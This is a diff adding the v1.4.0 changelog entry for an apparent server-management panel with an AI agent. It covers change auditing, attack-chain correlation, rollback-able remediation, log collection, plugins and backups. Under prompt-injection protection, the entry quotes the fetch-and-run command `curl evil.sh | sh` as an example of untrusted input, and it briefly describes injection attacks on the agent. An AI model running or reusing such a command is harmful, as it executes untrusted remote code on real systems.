@@ -2,6 +2,82 @@
 
 Change records for each version.
 
+## v1.4.0 (2026-11-02)
+
+**From "can remediate" to "remediation with evidence"**
+
+v1.3 taught the Agent to find problems on its own and act within boundaries. v1.4 fills in the other side: **understand what happened before acting**, and after acting, be able to explain what was done and whether it can be undone.
+
+In one sentence, this release: **every change on a host is recorded, judged, and correlated; every action is accounted for and rollback-able.**
+
+**Change awareness (new)**
+
+The most common line in operations troubleshooting is "I don't know what happened to it since it was last fine." This release closes that gap.
+
+- Six categories of change sources are continuously collected: configuration files (line-by-line diff), software packages, service status, account permissions, firewall rules, cron jobs
+- Attribution is graded in three levels and shown truthfully: `已确认` (can point to a specific person) / `推断` (probably who) / `未知`. No glossing over with the word "system"
+- Each record carries the hash of the previous one, forming a **tamper-evident chain** that can be verified at any time; if deleted or altered, it breaks at that point
+- diff is **redacted** before being written to the database (`password=`, `api_key=`, private key blocks)
+- **Rule review** first scores with 0 tokens (0–1, with three to five reasons): high-risk path, whether the operator can be confirmed, whether the source is public network, whether it is outside working hours, whether there are high-risk events in the same period, whether it was produced by a package manager... Only when judged suspicious (≥0.55) does it escalate to an event and wake the Agent
+- The Agent receives the **raw diff** for deep analysis and outputs "verdict / basis / recommendation", but has **no write permission whatsoever**
+- Known noise can be given **ignore rules** (supporting `**` wildcards); on match, not even an event is produced
+- Configuration and account changes retain the original file snapshot, can be rolled back directly from the detail page, and if that fails, rolled back again
+
+**Attack chain and remediation transactions (autonomous loop closure)**
+
+- **Attack chain**: strings "WebShell landing → suspicious process → outbound C2" into a single intrusion, five stages, shared indicators + temporal proximity scoring (≥0.45 merges). Deliberately tightened: standalone brute force does not open a chain, indicator and log spikes never enter a chain, and **a change is merged as a "persistence" stage only when all three conditions hold: judged suspicious + the change is in a location that survives reboot + landing or outbound has already appeared on the chain**
+- **Remediation transactions**: reversible actions (isolate/freeze/block/truncate/snapshot) are **automatically rolled back in reverse order** when remediation fails; irreversible actions explicitly list "N items cannot be undone" and do not pretend to have been reverted. Individual actions can be manually rolled back on the panel
+- **Shadow retrospective**: remediations run in shadow mode are later judged against the facts as `would_help` / `unnecessary` / `unknown` — consecutive `unnecessary` means the threshold should be tightened, consecutive `would_help` means it can be raised to assist
+- **Feedback suppression**: if the same event group is ignored twice within 7 days, the Agent is no longer woken (still recorded)
+- **Verification failure automatically retries once**, and feeds the previously blocked action and verification result back to the model to avoid repeating the same assumption
+- The change page and attack chain are **bidirectionally navigable**; each stage of the attack chain is annotated with its source (WebShell / suspicious process / network outbound / change)
+
+**Event noise reduction**
+
+Metric alerts and log spikes are now "folded as long as the event is not remediated" — a single CPU rule no longer floods eight pending items in one night. The login anomaly window is widened from 1 hour to half a day. If an event recurs after being remediated, a new one is created as usual; recurrences are not swallowed.
+
+**Log pipeline (new, disabled by default)**
+
+Built-in collection executor **compatible with Filebeat configuration**, positioned like filebeat on a managed host, but without needing a separate process.
+
+- Task directory `tasks.d` (one YAML per task), main configuration `main.yml` determines the output; existing filebeat configurations can be split apart and used directly
+- **31 Filebeat processors**: field add/remove/modify, JSON/CSV/XML/syslog parsing, dissect, script, fingerprint, domain and network direction
+- Three outputs: Elasticsearch, Kafka, Logstash (Lumberjack v2 + TLS)
+- `at-least-once`: offset advances only after successful delivery; failures go to a disk queue and are resent from the confirmed position after a crash
+- **No logs are collected by default**: it starts only when a task file appears, it is explicitly enabled, or a task is delivered from the platform
+- The panel's "Logs → Pipeline" shows running status, per-task read rate, and backlog, and can **preview the last 20 events in real time** — no need to query ES first when tuning processors
+
+**Plugin system (new)**
+
+The kernel only does what every host needs; business capabilities are delegated to plugins.
+
+- Plugins are **independent processes** that report metrics, events, and heartbeats over a Unix socket using line-delimited JSON; a crash does not affect the panel
+- Packages must carry sha256 and ed25519 signatures; installation verifies the signature, `apiVersion`, platform, and version requirements in order
+- Lifecycle: install → enable → run → disable → upgrade (old version retained for rollback) → delete
+- **Honest disclosure**: in this release, plugins run as the same user as the panel, **without** a dedicated system user or cgroup limits; `capabilities` is a declaration, not enforcement. The meaning of the signature is "trusted origin", not "safe behavior"
+- A public key must be configured in settings or unsigned mode enabled before installation (restart the panel after changing); official plugin packages have not yet been released, so an empty plugin page is the expected state
+
+**Backup and restore (new)**
+
+- Three backup targets: directory/file, `mysql:库名`, `redis:路径`, `tar.gz` + `manifest.json` (including sha256 per chunk)
+- Backup is truly one-click; **restore is not**: pre-check → automatic snapshot before restore → execute → automatic rollback on health check failure, and the snapshot name must be typed to confirm
+- Retention count is cleaned up by whole directory; individual chunks are never deleted
+- Backup is **the fourth type of cron job**, using the same engine as manual backup; failures are written back to the task status and trigger the "backup failure count" alert
+- Remote storage (S3-compatible / SFTP) code is ready, but **not part of this release's deliverables**; it takes effect only when manually configured in `config.yaml`, and has not been tested on real machines
+
+**Other**
+
+- Alert rules 12 → 24, baseline checks 13 → 45
+- AI large model integration supports four protocols: OpenAI / Anthropic / Azure / Gemini; the model list can be fetched and selected, no more typing model names by hand
+- **Injection protection** for Agent prompts: untrusted content (diff body, usernames, paths) cannot forge paragraph boundaries or close code fences early; the content itself is unchanged — `curl evil.sh | sh` must be delivered to the model as-is, because it is the conclusion
+- Event center aggregate members can be expanded to view all (previously only the first few were shown)
+- Fixes: `/files/du` empty path taking 15 seconds, change chain anchor false positives on existing databases, mobile change table being squeezed to one character per line
+- Data directory unified to `/data/opsmini`; uninstall deletes the directory
+
+**Upgrade notes**
+
+Upgrading from v1.3.x only requires replacing the binary and restarting; the database migrates automatically. New default policies such as `change-review` are seeded idempotently by name, and old databases receive them too. The log pipeline and plugins are disabled by default, so upgrading will not start collecting or loading anything.
+
 ## v1.3.0 (2026-10-28)
 
 **Autonomous Agent: from "you ask, it answers" to "it watches on its own"**
